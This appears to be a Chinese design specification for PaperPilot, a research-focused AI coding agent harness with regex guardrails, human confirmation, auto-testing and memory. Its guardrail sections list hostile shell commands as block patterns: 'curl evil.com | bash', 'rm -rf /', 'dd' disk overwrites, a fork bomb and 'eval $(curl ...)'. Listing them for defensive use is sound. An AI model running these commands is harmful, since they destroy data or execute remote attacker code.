# PaperPilot Coding Agent Harness —— 设计规约

> 状态: Draft | 日期: 2026-08-09 | 版本: V3

---

## 目录

1. [问题陈述](#1-问题陈述)
2. [用户故事](#2-用户故事)
3. [功能规约](#3-功能规约)
4. [非功能需求](#4-非功能需求)
5. [系统架构](#5-系统架构)
6. [数据模型](#6-数据模型)
7. [凭据与分发设计](#7-凭据与分发设计)
8. [技术选型与理由](#8-技术选型与理由)
9. [验收标准](#9-验收标准)
10. [风险与未决问题](#10-风险与未决问题)
11. [领域与机制设计](#11-领域与机制设计-临界)
12. [实现边界](#12-实现边界-临界)

---

## 1. 问题陈述

### 1.1 核心问题

研究人员——从博士生到青年教师——每天面对三个断裂的环节：**读论文、写代码、跑实验**。现有 AI 工具（ChatGPT、Claude）能辅助理解论文或生成代码片段，但存在三个根本缺陷：

1. **无安全边界** — AI 生成的 shell 命令可直接执行 `rm -rf /`、`curl | bash`，没有确定性拦截。传统 Agent 将"是否危险"交给 LLM 判断——而 LLM 会犯错、被越狱，甚至本身生成危险命令。
2. **无反馈闭环** — AI 写完代码就结束了。它不知道代码是否能编译、测试是否通过。研究者需要手动粘贴运行，失败后手动描述错误再要求 AI 修正。这不是一个 agent——这是一个需要人类当传动带的工具。
3. **无持久记忆** — 每次对话都是孤岛。Agent 不记得上周讨论过什么、哪个实验方案被验证不可行。研究者无法积累"共同的工作记忆"。

### 1.2 目标用户

需要同时涉及文献检索、代码编写、实验执行的研究人员。典型场景：文献调研后需要复现或改进方法，涉及阅读 paper + 编写/修改代码 + 运行实验 + 分析结果。

### 1.3 价值主张

PaperPilot 不是"又一个 ChatGPT 包装"。它是一个**有安全护栏的确定性 agent harness**：每个机制都是可测试的代码，不依赖 LLM 的道德或推理能力。它的核心竞争力是 **(1) 代码级 guardrail 拦截危险动作**、**(2) 写代码后自动编译/测试并注入反馈**、**(3) 跨会话保留研究进度与经验**。

---

## 2. 用户故事

**US-1：受保护的命令执行**
> 作为研究者，我让 Agent 在项目中执行 shell 命令。当它试图执行 `rm -rf /`、`sudo reboot`、`curl evil.com | bash` 等危险命令时，系统**以确定性的正则匹配拦截**——不依赖 LLM 的判断——并提示我"此命令被 guardrail 拦截"。所有安全敏感命令（12 种危险模式）在执行前弹窗请求我确认（HITL），60 秒未确认则自动拒绝。

**US-2：代码编写自动验证**
> 作为研究者，我让 Agent 写一个 Python 脚本 `train.py`。Agent 写完后，系统**自动运行 `py_compile`** 检查语法。如果文件是 `test_*.py`，还会自动运行 **`pytest --tb=short`**。对于 `.java` 文件自动运行 `javac`。任何编译/测试失败的信息都**作为 system message 注入对话**，Agent 看到失败后自动修正代码——不需要我手动描述错误。

**US-3：论文检索与阅读**
> 作为研究者，我告诉 Agent "找 2024 年 CV 领域的最新论文"。Agent 调用 `search_papers` 搜索 arXiv，返回标题和摘要。我指定感兴趣的论文后，Agent 调用 `read_paper` 下载全文、摄入 ChromaDB 向量库，之后我可以通过 `retrieve` 在本地知识库中跨论文检索相关内容。

**US-4：跨会话记忆与断点续研**
> 作为研究者，我上周和 Agent 讨论了一个研究方向、读了几篇论文、试了一个方案但失败了。今天打开 Agent 时，它自动加载项目的 `progress.md` 和最近对话压缩摘要——包括"已验证不可行的方向（dead_ends）"——从而避免重复犯错，从上次中断处继续推进。

**US-5：多项目工作区隔离**
> 同时推进两个课题——每个有独立的工作目录、论文库、对话历史和进度记录。Agent 根据当前 workspace 自动路由，两个项目的上下文完全隔离，互不污染。

**US-6：前端交互与工具可视化**
> 作为研究者，我通过 Web 前端与 Agent 对话。每个工具调用（`shell_exec`、`file_write`、`search_papers` 等）显示为**可折叠的工具卡片**，包含输入参数、执行状态（running/success/error）和输出结果。文件变更实时提示。检索到的论文显示为**引用卡片（citation cards）**，带有标题、作者、年份和摘要摘录。

**US-7：子任务并行执行**
> 当任务可以分解为独立子任务（如同时查阅多篇论文的不同方面），Agent 调用 `spawn_subagent` 并行执行，最后合并结果——节省串行等待时间。

---

## 3. 功能规约

### 3.1 Agent Loop（主循环）

Agent 循环是一个**自实现的 ReAct-style function-calling 循环**，核心逻辑位于 `agent.py:run_agent()`：

| 参数 | 值 | 说明 |
|------|------|------|
| MAX_ROUNDS | 50 | 最大对话轮次，防止无限循环 |
| MAX_SEARCH_CALLS | 10 | 搜索上限，避免过度调用外部 API |
| MAX_TOTAL_RETRIES | 5 | 全局重试上限 |
| LLM_RETRY_BACKOFF | [1, 2, 4] | 指数退避重试间隔（秒） |
| HITL_TIMEOUT | 60 | 用户确认超时（秒） |

**循环流程**：

```
用户输入 → build_context（组装项目/历史/记忆）
         → LLM 调用（litellm function calling, tool_choice="auto"）
         → 解析 tool_calls → 对每个 tool call:
              1. guardrail 检查（仅 shell_exec）
              2. HITL 确认弹窗（12-pattern 命中时）
              3. validate_tool_params 参数校验
              4. registry.dispatch 执行
              5. 失败 → 错误消息注入 messages + 重试计数
              6. 成功 → 结果注入 messages
              7. file_write/file_edit: _auto_validate 自动验证
         → 无 tool_calls → 流式输出 final_response
         → _save_turn 持久化本轮对话
         → _maybe_compress 压缩旧对话
```

**动态工具过滤**：当 `search_papers` 有返回结果后，自动从 tools_list 中移除 `retrieve`——因为 arXiv 新论文不在本地 ChromaDB 中，避免 LLM 用错工具。

**循环保护**：
- 连续 3 次检索返回空 → 强制直接回答
- 连续 2 次 retrieve 返回 < 3 条 → 提示改用 search_papers
- search_papers 达到上限 → 注入系统消息禁止继续搜索，要求用 read_paper

**auto checkpoint**：每轮成功的文件/命令操作后，自动 git commit 保存快照。

### 3.2 Tool System（工具系统）

13 个内置工具通过 `ToolRegistry`（单例模式）注册与调度：

#### 研究层（5 个）
| 工具 | 说明 | 关键行为 |
|------|------|----------|
| `retrieve` | 本地知识库混合检索 | 向量+BM25+RRF(k=60)，project-aware 过滤 |
| `search_papers` | arXiv 论文搜索 | 返回元数据列表，LLM 可选相关性过滤，不自动摄入 |
| `read_paper` | 读论文全文 | 先从 ChromaDB 查本地全文，再从 arXiv 取元数据，异步下载 PDF |
| `update_notes` | 记录研究笔记 | 追加到 project.progress_text 和 progress.md |
| `delete_paper` | 删除论文 | 同时删除 SQLite + ChromaDB + 工作区文件 |

#### 执行层（2 个）
| 工具 | 说明 | 关键行为 |
|------|------|----------|
| `shell_exec` | 执行 Shell 命令 | foreground/background 模式，cwd 锁定到项目目录，超时 5min |
| `check_tasks` | 查询后台任务状态 | 读取 tasks/ 目录下的 JSON 元数据和日志 |

#### 文件层（5 个）
| 工具 | 说明 | 关键行为 |
|------|------|----------|
| `file_read` | 读取文件 | 限制 1MB，截断 8000 字符 |
| `file_write` | 写入/覆盖文件 | 自动创建父目录，emit file_change 事件 |
| `file_edit` | 精确替换 | old_string 必须唯一（found 0 或 >1 均报错） |
| `file_glob` | 文件名模式匹配 | 支持 `**` 递归，排除 .git |
| `file_grep` | 正则搜索文件内容 | 最多 30 条匹配，跳过 > 500KB 文件 |

#### 编排层（1 个）
| 工具 | 说明 | 关键行为 |
|------|------|----------|
| `spawn_subagent` | 并行子任务 | ThreadPoolExecutor，每个子 agent 有独立 LLM 调用，合并结果 |

**注册机制**：`ToolRegistry.register()` 包含功能去重检查（description 相似度 > 80% → 拒绝）。`my_tools/` 目录下的 `.py` 文件自动导入，用户可扩展工具。

**反混淆提示**：`add_anti_confusion_hints()` 为易混淆工具对（如 retrieve vs search_papers、file_write vs file_edit）注入使用说明，减少 LLM 工具选择错误。

### 3.3 Governance / Guardrail（治理护栏 — 核心贡献）

治理模块是本 harness 区别于所有 LLM 框架的关键差异：**所有安全检查都是确定性代码，不依赖 LLM 判断**。

#### Guardrail（guardrail.py）
- **12 个危险正则模式**：`rm -rf /`、`rm -rf ~`、`rm -rf $HOME`、`mkfs.`、`dd if=`、`> /dev/sd`、`chmod 777 /`、fork bomb `:(){`、`wget | sh`、`curl | bash`、`eval`、`sudo`
- **确定性拦截**：匹配任一模式 → 返回拦截原因字符串；否则返回 `None`（允许）
- **仅作用于 shell_exec**：其他工具不触发 guardrail
- **测试无需 LLM**：`test_guardrail_blocks_dangerous()` 等 6 个断言全部通过

#### HITL (Human-in-the-Loop)
- **触发条件**：guardrail 返回非 None
- **实现**：`threading.Event` + 60 秒超时 + `_pending_confirms` 字典
- **前端协议**：emit `confirm_required` SSE 事件 → 前端弹出确认对话框 → 用户点击允许/拒绝 → `POST /api/confirm` → `Event.set()` + `approved` flag
- **超时默认拒绝**：60 秒未确认 → 自动取消，消息注入 "User cancelled: {reason}"

#### Path Sandbox（路径沙箱）
- `_safe_path()` 将所有文件操作锁定在项目目录内
- 使用 `os.path.normpath` + `startswith` 检查，任何 `..` 逃逸直接拒绝

#### Param Validation（参数校验）
- `validate_tool_params()` 在 dispatch 前检查必需参数是否存在且非空
- 对特定工具做类型检查（如 `spawn_subagent` 的 `subtasks` 必须是非空 list）
- 检查失败 → 返回错误消息供 LLM 修正，计入 retry count

### 3.4 Feedback Loop（反馈闭环）

`_auto_validate()` 在 `file_write` 和 `file_edit` 成功后自动触发：

| 文件类型 | 验证动作 | 实现 |
|----------|----------|------|
| `*.py` | `py_compile.compile(doraise=True)` | `subprocess.run` |
| `*_test.py` / `test_*.py` | `pytest --tb=short -q` | `subprocess.run` |
| `*.java` | `javac {path}` | `subprocess.run` |

验证失败 → 将错误信息（stderr/stdout）作为 `system` 消息注入 `messages` 列表 → LLM 在下一轮看到错误并自动修正。这是**确定性的代码级反馈**，不需要人类做"粘贴错误信息"的中间人。

`validate.py` 还提供 `validate_result()` 函数，对不同工具的输出结果做结构化校验：`shell_exec` 检查 returncode、`file_write/file_edit` 检查文件大小、`retrieve` 检查 found 计数。失败时返回 `retry_hint` 供 LLM 自我修正。

### 3.5 Context / Memory（上下文与记忆）

#### Context Builder（context.py）
每轮对话传给 LLM 的上下文按以下顺序组装：

1. **系统指令**（BASE_SYSTEM_PROMPT）— 角色定义 + 回复格式规则
2. **工具能力**（`registry.generate_capabilities()`）— 可用工具列表与描述
3. **项目上下文** — 当前项目 topic + `progress.md` 最近 20 条进度
4. **对话历史** — 压缩摘要（conclusions + dead_ends）+ 最近 10 轮未压缩对话
5. **Skill/Workflow** — 触发匹配时注入（如 SURVEY_WORKFLOW）
6. **用户输入** — 最后，保持最新

**Token 管理**：`tiktoken` 计算 token 数，模型自适应截断（DeepSeek=64K, GPT-4o=128K, Claude=200K）。长消息超过上限一半时截断。

**Context Injection**：
- `SURVEY_WORKFLOW`：当用户输入含"综述/survey/review/文献调研"关键词时注入分步写作流程
- `skill_loader`：从 `skills/` 目录加载 YAML frontmatter Markdown 技能文件，匹配 trigger 关键词后注入技能上下文

#### Memory（memory.py + project_manager.py）
- **存储后端**：文件系统 JSON 文件（`~/.research-agent-data/projects/{project_id}/conversations/{chat_id}.json`）
- **Workspace 隔离**：每个 workspace 对应的 chat 完全隔离，不同项目互不污染
- **压缩机制**：当 uncompressed turns > 10 时触发 `_maybe_compress()`，LLM 将旧轮次压缩为 JSON（conclusions + dead_ends 两字段），标记对应 turn 的 `compressed=True`
- **进度持久化**：压缩同时更新 `progress.md`（一句摘要），累积记录项目进展
- **跨会话恢复**：`build_context()` 加载 progress.md + 压缩摘要 + 最近对话，Agent 启动即可恢复上下文

### 3.6 Chat / Workspace Management（对话与工作区管理）

- **项目初始化**：首次使用 workspace 时自动创建 `.research-agent/project.json` marker，生成 project_id（SHA256 hash of path）
- **Chat 生命周期**：CRUD 操作通过 `project_manager.py` 管理 JSON 文件
- **Git 集成**：项目初始化自动 `git init`，每轮成功后自动 checkpoint commit
- **Papers 管理**：工作区内的 `papers/` 目录存放论文 Markdown，SQLite `project_papers` 表记录关联

### 3.7 Frontend（前端）

- **技术栈**：React + TypeScript + Vite
- **协议**：Server-Sent Events（SSE），单次 POST `/api/chat` 返回流式响应
- **事件类型**：`thinking`（思考过程）、`tool_start/tool_end`（工具调用状态）、`file_change`（文件变更）、`reply`（流式文本）、`confirm_required`（HITL 确认）、`citations`（引用论文卡片）、`sources`（检索来源）
- **UI 组件**：可折叠工具调用块（显示状态图标 + 输入/输出）、引用论文卡片、侧边栏项目管理、多 chat tab
- **设置面板**：前端直接配置 API Key / model / base URL，覆盖 config.yml

---

## 4. 非功能需求

| 维度 | 规约 |
|------|------|
| **性能** | 首次检索 < 2s（向量+BM25+RRF）；单轮 agent loop < 15s；PDF 摄入 < 30s |
| **安全** | 12-pattern 确定性 guardrail；路径沙箱防止逃逸；HITL 60s 超时默认拒绝；API key 三层优先级（环境变量 > config.yml > 前端传入） |
| **可靠性** | LLM 调用 3 次指数退避重试；全局 5 次重试上限；ChromaDB 不可用时优雅降级到纯 BM25 |
| **可观测性** | SSE 事件流暴露每步状态；tiktoken 计算 token 消耗；`retrieve` 自动评估 Precision@5/8/10 + Recall |
| **可测试性** | `MockLLMProvider` 支持无网络离线测试；19 个 harness mechanisms 测试无需 LLM；guardrail/validate/parse 均为纯函数 |
| **可扩展性** | `my_tools/` 目录 + `skills/` 目录热加载；ToolRegistry 单例模式全局注册；MCP Manager 自动发现外部 MCP server |

---

## 5. 系统架构

### 5.1 组件图（文本）

```
┌─────────────────────────────────────────────────────────────────────┐
│                        Frontend (React + TS)                         │
│  Chat UI · Tool Cards · Citation Panel · Settings · Project Nav     │
└──────────────────────────────┬──────────────────────────────────────┘
                               │ SSE (EventSource) / REST
┌──────────────────────────────▼──────────────────────────────────────┐
│                     FastAPI Server (server.py)                       │
│  /api/chat (SSE) · /api/workspaces · /api/papers · /api/confirm    │
│  /api/graph · /api/upload/pdf · /api/chats · /api/skills            │
└──────────────────────────────┬──────────────────────────────────────┘
                               │
┌──────────────────────────────▼──────────────────────────────────────┐
│                     Agent Core (agent.py)                            │
│  run_agent() — ReAct Function-Calling Loop                         │
│  ┌──────────┐ ┌───────────┐ ┌───────────┐ ┌──────────┐            │
│  │ Guardrail│ │  HITL     │ │ Feedback  │ │Context   │            │
│  │ (12 regex)│ │ (Event)   │ │ (pytest)  │ │ Builder  │            │
│  └──────────┘ └───────────┘ └───────────┘ └──────────┘            │
│  ┌──────────────────────────────────────────────────┐              │
│  │              ToolRegistry + Dispatch              │              │
│  │  13 builtins · my_tools/ · MCP auto-loader       │              │
│  └──────────────────────────────────────────────────┘              │
└──────────────────────────────┬──────────────────────────────────────┘
                               │
┌──────────────────────────────▼──────────────────────────────────────┐
│                         Data Layer                                   │
│  ┌─────────────┐  ┌──────────────┐  ┌──────────────────────────┐   │
│  │ ChromaDB     │  │ SQLite       │  │ File System (JSON)       │   │
│  │ vectors +    │  │ papers +     │  │ project.json +           │   │
│  │ metadata     │  │ kg relations │  │ conversations/*.json     │   │
│  └──────┬───────┘  └──────┬───────┘  └──────────┬───────────────┘   │
│         │                 │                      │                    │
│  ┌──────▼─────────────────▼──────────────────────▼───────────────┐  │
│  │  sentence-transformers (BGE-M3/bge-small-zh) · BM25 (jieba)  │  │
│  └────────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
                               │
┌──────────────────────────────▼──────────────────────────────────────┐
│                     External Dependencies                            │
│  litellm (LLM abstraction) · arXiv API · PyMuPDF (PDF parsing)     │
│  tiktoken (token counting) · networkx (knowledge graph)             │
└─────────────────────────────────────────────────────────────────────┘
```

### 5.2 数据流

```
用户输入 → FastAPI SSE endpoint
              ↓
         build_context（项目进度 + 对话历史 + 压缩摘要 + skill injection）
              ↓
         run_agent() loop:
              LLM function calling → tool_calls 列表
              ↓
         对每个 tool_call:
              guardrail → HITL → validate_params → dispatch
              ↓
         结果注入 messages → _auto_validate (if file_write/edit)
              ↓
         循环直至 LLM 返回纯文本 → 流式输出 final_response
              ↓
         _save_turn → _maybe_compress → _mark_waiting_if_needed
              ↓
         SSE events: thinking / tool_start / tool_end / file_change / reply / citations
```

### 5.3 外部依赖

| 依赖 | 用途 | 降级方案 |
|------|------|----------|
| litellm | LLM 统一接口（DeepSeek/GPT/Claude/Gemini 等） | 无；核心依赖 |
| chromadb | 向量存储 + 语义检索 | 不可用时自动降级为**纯 BM25** |
| sentence-transformers | 文本 embedding（BGE-M3 / bge-small-zh-v1.5） | local_files_only 优先 |
| jieba | 中文分词（BM25 tokenization） | 中英双语 boost |
| rank-bm25 | BM25 关键词检索 | 纯 Python，零外部依赖 |
| PyMuPDF (fitz) | PDF 文本提取 | 无 |
| tiktoken | Token 计数（cl100k_base encoding） | 粗略估算（len/4） |
| networkx | 知识图谱构建 | 仅 V2 使用 |
| React + TypeScript + Vite | 前端 | 需要 Node.js 构建 |

---

## 6. 数据模型

### 6.1 核心实体（Python dataclass）

```python
@dataclass
class AgentState:           # 运行时 agent 状态
    user_input: str
    workspace_dir: str
    active_chat_id: str
    active_project: Project | None
    retrieved_chunks: list[dict]    # 检索结果
    conversation_turns: list       # 最近对话轮次
    compressed_summaries: list[str]
    round_count: int               # 当前轮次
    errors: list[str]
    final_response: str
    confidence: str                # certain/speculative/uncertain
    citations: list[str]           # 引用 ID 列表
    _pending_confirms: dict        # HITL 待确认项

@dataclass
class Project:              # 项目/工作区
    id: str                 # SHA256 hash of workspace_dir
    topic: str
    status: ProjectStatus   # ACTIVE/WAITING/PAUSED/DONE
    progress_text: str      # 累积进度日志
    pending_task: PendingTask | None
    workspace_dir: str
    created_at: str
    updated_at: str

@dataclass
class ConversationTurn:     # 单轮对话
    id: str
    round_number: int
    user_message: str
    assistant_message: str
    timestamp: str
    compressed: bool         # 是否已压缩
    summary: str             # 压缩摘要（JSON: conclusions + dead_ends）

@dataclass
class Paper:                # 论文元数据（SQLite）
    id: str
    title: str
    doi: str
    year: int
    source_score: int       # 来源评分（1-10）
    citation_count: int
    authors: list[str]
    abstract: str
    file_path: str

@dataclass
class Action:               # Guardrail 输入
    action: str             # 工具名称
    query: str              # 命令/参数
```

### 6.2 存储分布

| 数据 | 存储 | 格式 |
|------|------|------|
| Paper 元数据 | SQLite (`papers` 表) | 结构化行 |
| Paper chunks | ChromaDB Collection (`research_chunks`) | 向量 + metadata |
| Paper 摘要 | ChromaDB (`{paper_id}_summary`) | 向量文档 |
| Project 配置 | File System (`project.json`) | JSON |
| Chat 对话 | File System (`conversations/{chat_id}.json`) | JSON |
| 项目进度 | File System (`progress.md`) | Markdown |
| 知识图谱 | SQLite (`claims` / `kg_relations` 表) | 结构化行（V2） |
| 后台任务日志 | File System (`tasks/{task_id}.log` + `.json`) | 文本 + JSON |

### 6.3 Chroma Chunk Metadata

```json
{
  "paper_id": "uuid-xxx",
  "chunk_index": 3,
  "title": "Paper Title",
  "authors": "Author1, Author2",
  "year": 2024,
  "doi": "10.xxx/yyy"
}
```

- `chunk_index = -1` 标记为论文摘要（paper-level summary）
- 按 `paper_id` 过滤可获取单篇论文全部 chunks
- 按 `chunk_index` 排序可拼接还原全文

---

## 7. 凭据与分发设计

### 7.1 API Key 管理

三层优先级：

1. **环境变量**（如 `ANTHROPIC_API_KEY`、`DEEPSEEK_API_KEY`）— 最高优先级
2. **config.yml**（`~/.research-agent-data/config.yml`）— 持久化配置
3. **前端传入**（`POST /api/chat` 的 `config.apiKey` 字段）— 会话级临时覆盖

**已知风险**：config.yml 中的 API key 以明文存储。当前优先考虑本地单用户场景，生产环境需引入加密存储。

### 7.2 分发形态

| 形态 | 说明 |
|------|------|
| **Docker** | `Dockerfile` 构建容器镜像，一键部署 |
| **pywebview Desktop** | Python 后端 + 内嵌 Chromium 窗口 + 原生文件选择器 |
| **PyInstaller** | 单文件可执行程序（Windows/macOS/Linux） |
| **Render** | 云端 PaaS 部署（`render.yaml`）|
| **源码运行** | `pip install` + 手动启动 |

### 7.3 运行模式

- **Web 模式**：`python -m research_agent.server` → FastAPI at `localhost:8050`
- **CLI 模式**：`python -m research_agent.cli` → 命令行交互（SSE 事件流打印）
- **Desktop 模式**：`python desktop.py` → pywebview 原生窗口

---

## 8. 技术选型与理由

| 层面 | 选型 | 理由 |
|------|------|------|
| **语言** | Python 3.11+ | LLM/RAG/NLP 生态最丰富；目标用户群体（研究人员）最熟悉 |
| **后端框架** | FastAPI | 原生 async 支持 SSE 流式响应；自动 OpenAPI 文档；轻量高性能 |
| **LLM 接入** | litellm | 支持 100+ 模型统一接口；function calling 原生支持；免费切换 provider |
| **Agent 循环** | **自实现**（非 LangChain/AutoGen/CrewAI） | 完全可控的确定性代码；无框架黑盒；每个循环步骤可单独测试 |
| **前端** | React + TypeScript + Vite | 工具卡片需富交互；SSE EventSource 原生支持；生态成熟 |
| **嵌入模型** | sentence-transformers (BGE-M3 / bge-small-zh) | 本地运行，零 API 成本；bge-small-zh 中英文混排优化 |
| **向量库** | ChromaDB | 嵌入式部署，零运维；PersistentClient 持久化；支持 metadata 过滤 |
| **BM25** | rank-bm25 | 纯 Python，零外部依赖；与 jieba 配合实现中文分词 |
| **PDF 解析** | PyMuPDF (fitz) | 处理 PDF 阅读顺序；速度快（C 扩展）；覆盖主流格式 |
| **Token 计数** | tiktoken | OpenAI cl100k_base 标准；轻量 |
| **知识图谱** | networkx | Python 原生图库；千级节点够用（V2） |
| **关系存储** | SQLite | 零配置，嵌入式，适合单用户本地场景 |
| **文件存储** | File System JSON | 人类可读、可手动编辑、可 git 追踪、调试友好 |

### 关键架构决策

**不使用 Agent 框架（LangChain / AutoGen / CrewAI）**：
- LangChain AgentExecutor 将循环逻辑封装为黑盒，调试困难
- AutoGen/CrewAI 面向多 Agent 场景，引入不必要的复杂度
- 自实现循环：50 行代码的 `for round_num in range(MAX_ROUNDS)`，完全透明
- 每个机制（guardrail、validate、dispatch）都是独立可测试的纯函数

**使用 litellm 而非直接调用 SDK**：
- 同一套代码支持 DeepSeek、GPT-4o、Claude、Gemini、本地模型
- function calling schema 自动转换（OpenAI format → 各 provider）
- 前端可自由切换 model，无需重启服务

**文件系统 JSON 而非数据库存储对话**：
- JSON 文件可 git 版本控制，可手动编辑还原
- 无 schema migration 问题
- 备份 = 复制目录

---

## 9. 验收标准

| 用户故事 | 验收标准 |
|----------|----------|
| **US-1 命令安全** | `rm -rf /`、`sudo`、`curl \| bash`、fork bomb 等 12 种模式全部拦截；非 shell_exec 工具不触发 guardrail；确定性地每次拦截（非概率性） |
| **US-2 自动验证** | `file_write *.py` → 自动 py_compile；`test_*.py` → 自动 pytest；`*.java` → 自动 javac；失败信息以 system message 注入 |
| **US-3 论文检索** | `search_papers` 返回 arXiv 摘要；`read_paper` 摄入本地；`retrieve` 跨论文检索；read_paper 后论文可被 retrieve 找到 |
| **US-4 跨会话记忆** | 新建对话 → 自动加载 progress.md 和压缩摘要（含 dead_ends）；关闭重启后能从断点继续 |
| **US-5 多项目隔离** | 两个 workspace 的对话历史、论文列表、进度完全独立；切换 workspace 不污染上下文 |
| **US-6 前端交互** | 工具调用显示为可折叠卡片（含状态图标）；citation cards 显示论文信息；confirm dialog 60s 超时默认拒绝 |
| **US-7 子任务并行** | `spawn_subagent` 并发执行 ≥ 2 个子任务，结果合并后返回 |
| **Harness 测试** | `pytest tests/test_harness_mechanisms.py -v` 全部通过；MockLLMProvider 驱动测试无需网络/API |

---

## 10. 风险与未决问题

### 10.1 风险矩阵

| 风险 | 等级 | 应对 |
|------|------|------|
| **Guardrail 绕过** | 🟡 中 | 12 regex 覆盖主流危险模式；新增模式持续追加；路径沙箱独立防御 |
| **LLM 幻觉导致错误操作** | 🟡 中 | HITL 弹窗确认危险命令；参数校验拦截不完整调用；自动验证捕获错误代码 |
| **Loop 发散 / token 消耗失控** | 🟡 中 | MAX_ROUNDS=50；MAX_SEARCH_CALLS=10；连续检索失败 3 次强制终止 |
| **ChromaDB 不可用** | 🟢 低 | 自动降级为纯 BM25 检索；降级对用户透明 |
| **LLM API 不可用** | 🟡 中 | 3 次指数退避重试（1s/2s/4s）；全局 5 次重试上限 |
| **API Key 明文存储** | 🔴 高 | 当前 config.yml 明文风险；短期方案：文档警告 + 环境变量优先；长期方案：本地加密（如 keyring） |
| **PDF 下载失败** | 🟢 低 | read_paper 先返回摘要，异步下载；失败时提示用户手动提供 |
| **跨平台兼容性** | 🟡 中 | Windows 路径反斜杠处理；shell_exec 在 Windows 使用 PowerShell；pywebview 打包 |

### 10.2 未决问题

1. **对话压缩质量**：LLM 摘要可能丢失关键信息。需建立压缩前后的"关键事实保留率"评估指标。
2. **知识图谱引入时机**：networkx 图构建（Claim/Relation）依赖 LLM 抽取质量，是否值得在 V3 激活需效果评估。
3. **多 Agent 协作**：`spawn_subagent` 是并行子任务而非独立 Agent。多 Agent 互发现和通信机制不在当前 scope。
4. **API Key 加密存储**：需引入 keyring 或本地加密方案，平衡安全性与单用户便利性。
5. **前端构建部署**：React dist 需 prebuild；开发模式需 proxy 到 FastAPI。pywebview 打包流程需标准化。

---

## 11. 领域与机制设计 (§A.3 — 临界)

### 11.1 Actions / Tools — 13 个确定性工具

| 工具 | 输入 | 输出 | 类别 |
|------|------|------|------|
| `retrieve` | query: str | 本地知识库检索结果（向量+BM25+RRF） | 研究/只读 |
| `search_papers` | query: str | arXiv 论文元数据列表 | 研究/外部 |
| `read_paper` | paper_id: str | 论文全文（本地或 ArXiv 获取） | 研究/摄入 |
| `update_notes` | notes: str | 写入 progress.md | 研究/持久化 |
| `delete_paper` | paper_id: str | 从 SQLite+ChromaDB+工作区删除 | 研究/删除 |
| `shell_exec` | command: str, timeout?, background? | stdout/stderr/returncode | 执行 |
| `check_tasks` | task_id?: str | 后台任务状态与输出 | 执行/监控 |
| `file_read` | path: str | 文件内容（截断 8000 chars） | 文件/只读 |
| `file_write` | path: str, content: str | 写入成功/失败 | 文件/写入 |
| `file_edit` | path, old_string, new_string | 替换成功/失败 | 文件/修改 |
| `file_glob` | pattern: str | 匹配文件列表 | 文件/查找 |
| `file_grep` | pattern: str, include?: str | 匹配行列表 | 文件/搜索 |
| `spawn_subagent` | subtasks: list, worker_model? | 合并结果 | 编排/并行 |

### 11.2 Objective Feedback Signals — 确定性反馈

| 反馈类型 | 触发条件 | 信号内容 | 用途 |
|----------|----------|----------|------|
| **py_compile** | file_write/edit `*.py` | 编译错误（SyntaxError traceback） | Agent 看到后修正语法 |
| **pytest** | file_write/edit `test_*.py` / `*_test.py` | 测试失败详情（--tb=short） | Agent 看到后修正逻辑 |
| **javac** | file_write/edit `*.java` | 编译错误 | Agent 看到后修正 |
| **validate_result()** | 每次 dispatch 后 | 结构化校验（passed/errors/hint） | 注入 messages 触发修正 |
| **validate_response()** | 最终回复后 | 引用一致性检查（hallucinated_citation） | 标记 confidence |
| **_evaluate_retrieval()** | 每次 retrieve 后 | Precision@5/8/10 + Recall | 观察用，不注入 |

**关键性质**：所有反馈信号都是 `subprocess.run` 或确定性函数产生的——**不是 LLM 自我评估**。Agent 不会自己判断自己的输出是否正确，而是由外部工具客观判断。

### 11.3 Dangerous Actions — 12-pattern 代码级拦截

| 模式 | 示例 | 处理 |
|------|------|------|
| `rm -rf /` | `rm -rf / --no-preserve-root` | HITL 弹窗 → 60s 确认/拒绝 |
| `rm -rf ~` | `rm -rf ~/.*` | HITL 确认 |
| `rm -rf $HOME` | `rm -rf $HOME/*` | HITL 确认 |
| `mkfs.` | `mkfs.ext4 /dev/sda1` | HITL 确认 |
| `dd if=` | `dd if=/dev/zero of=/dev/sda` | HITL 确认 |
| `> /dev/sd` | `echo > /dev/sda` | HITL 确认 |
| `chmod 777 /` | `chmod 777 /etc/passwd` | HITL 确认 |
| fork bomb | `:(){ :\|:& };:` | HITL 确认 |
| `wget \| sh` | `wget url \| sh` | HITL 确认 |
| `curl \| bash` | `curl url \| bash` | HITL 确认 |
| `eval` | `eval $(curl ...)` | HITL 确认 |
| `sudo` | `sudo rm ...` | HITL 确认 |

**关键性质**：拦截是确定性的——正则匹配，不是 LLM 判断。每次匹配到相同模式一定触发拦截。可被 MockLLMProvider 测试。

### 11.4 Memory — 跨会话持久化

| 数据 | 写入时机 | 读取时机 | 生命周期 |
|------|----------|----------|----------|
| **Chat turns** | 每轮 `_save_turn()` | `build_context()` | 会话级，未压缩的保留在上下文 |
| **压缩摘要** | uncompressed > 10 时压缩 | `build_context()` 注入 | 跨会话，标记 `compressed=True` |
| **progress.md** | 压缩时更新 + `update_notes` | `build_context()` 注入 | 跨会话，累积追加 |
| **dead_ends** | 压缩时提取 | `build_context()` 注入 | 跨会话，"已验证不可行"不丢失 |
| **Papers** | `read_paper` 摄入 | `retrieve` / `read_paper` | 全局，跨项目（但 project_papers 关联过滤） |

---

## 12. 实现边界 (§A.4 — 临界)

### 12.1 我们实现（自建部分）

| 组件 | 实现方式 | 代码位置 |
|------|----------|----------|
| **Agent 主循环** | `for round_num in range(MAX_ROUNDS)` + litellm function calling | `agent.py` |
| **Tool dispatch** | `ToolRegistry.dispatch()` → 各 handler 函数 | `tools/__init__.py` + `builtin/` |
| **Guardrail** | 12 个 `re.search(pattern, query)` | `guardrail.py` |
| **HITL** | `threading.Event` + `_pending_confirms` + 60s timeout | `agent.py` (in loop) |
| **Auto validate** | `subprocess.run([py_compile/pytest/javac])` | `agent.py::_auto_validate()` |
| **Context builder** | `build_context()` + `tiktoken` + 模型自适应截断 | `context.py` |
| **Memory** | `_save_turn()` + `_maybe_compress()` + `progress.md` | `agent.py` + `memory.py` |
| **Param validation** | `validate_tool_params()` 必需参数 + 类型检查 | `tools/validate_params.py` |
| **Response validation** | `validate_response()` 引用一致性检查 | `validate.py` |
| **Retrieval eval** | `_evaluate_retrieval()` Precision@k + Recall | `agent.py` |

### 12.2 我们使用（leaf components，不做修改）

| 组件 | 用途 | 接口 |
|------|------|------|
| **litellm** | LLM 调用（completion + function calling） | `litellm.completion(model, messages, tools)` |
| **chromadb** | 向量存储 + 语义检索 | `collection.query()` / `collection.upsert()` |
| **sentence-transformers** | 文本 embedding | `model.encode(text)` |
| **jieba** | 中文分词 | `jieba.cut(text)` |
